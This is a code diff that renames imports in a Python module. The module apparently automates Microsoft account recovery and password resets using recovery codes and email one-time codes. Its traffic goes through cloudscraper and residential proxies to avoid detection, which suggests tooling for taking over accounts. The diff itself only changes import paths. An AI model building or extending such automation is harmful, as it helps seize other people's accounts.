@@ -1,6 +1,6 @@
-from securing.utils.cookies.get_email_code import get_email_code
-from securing.utils.cookies.get_livedata import livedata
-from securing.utils.cookies.safe_cookies import dedupe_cookies, has_cookie
+from authsecuring.utils.cookies.get_email_code import get_email_code
+from authsecuring.utils.cookies.get_livedata import livedata
+from authsecuring.utils.cookies.safe_cookies import dedupe_cookies, has_cookie
 from urllib.parse import unquote
 import asyncio
 import logging
@@ -385,7 +385,7 @@ def _parse_json(response: httpx.Response, step: str) -> dict | None:
 def _new_cloudscraper(proxy_url: str | None, *, what: str):
     """cloudscraper Session pinned to the residential proxy (never the VPS)."""
     import cloudscraper
-    from securing.utils.proxy import apply_requests_proxy
+    from authsecuring.utils.proxy import apply_requests_proxy
 
     client = cloudscraper.create_scraper()
     client.headers.update(
@@ -428,7 +428,7 @@ def _verify_recovery_code_cloudscraper_sync(
     )
 
     try:
-        from securing.utils.proxy import microsoft_proxy_url
+        from authsecuring.utils.proxy import microsoft_proxy_url
 
         client = _new_cloudscraper(
             proxy_url if proxy_url is not None else microsoft_proxy_url(),
@@ -543,7 +543,7 @@ async def check_recovery_code_valid(
 
     Returns ``(ok|bad|unknown, reason)``.
     """
-    from securing.utils.proxy import microsoft_proxy_url
+    from authsecuring.utils.proxy import microsoft_proxy_url
 
     status, reason, _ = await asyncio.to_thread(
         _verify_recovery_code_cloudscraper_sync,
@@ -570,7 +570,7 @@ def _recover_cloudscraper_sync(
     import time
     from urllib.parse import quote_plus, unquote as _unquote
 
-    from securing.utils.proxy import microsoft_proxy_url
+    from authsecuring.utils.proxy import microsoft_proxy_url
 
     recovery_code = (recovery_code or "").strip().upper().replace(" ", "")
     reset_url = (
@@ -779,7 +779,7 @@ async def recover(
     Raises RecoverError for invalid recovery codes / known MS rejects.
     Returns the new recovery code string on success, or None on soft failure.
     """
-    from securing.utils.proxy import microsoft_proxy_url
+    from authsecuring.utils.proxy import microsoft_proxy_url
 
     recovery_code = (recovery_code or "").strip().upper().replace(" ", "")
     proxy_url = microsoft_proxy_url(session)
@@ -1196,11 +1196,11 @@ def _poll_email_otp_sync(
     """Blocking OTP poll for cloudscraper worker threads."""
     import time
 
-    from securing.utils.cookies.get_email_code import (
+    from authsecuring.utils.cookies.get_email_code import (
         _extract_otp,
         _is_skippable_notification,
     )
-    from database.database import DBConnection
+    from storage.romeo_db import RomeoDB as DBConnection
 
     deadline = time.monotonic() + timeout
     mail_l = (mail or "").lower().strip()
@@ -1321,7 +1321,7 @@ def _reset_password_otp_cloudscraper_sync(
     import time
     from urllib.parse import quote_plus, unquote as _unquote
 
-    from securing.utils.proxy import microsoft_proxy_url
+    from authsecuring.utils.proxy import microsoft_proxy_url
 
     email = (email or "").strip()
     security_email = (security_email or "").strip()
@@ -1538,7 +1538,7 @@ async def reset_password_via_security_email_otp(
     proxy_url: str | None = None,
 ) -> bool:
     """Async wrapper — cloudscraper on the sticky residential proxy."""
-    from securing.utils.proxy import microsoft_proxy_url
+    from authsecuring.utils.proxy import microsoft_proxy_url
 
     try:
         print("[~] ResetPassword via security-email OTP (HAR / fabric path)")
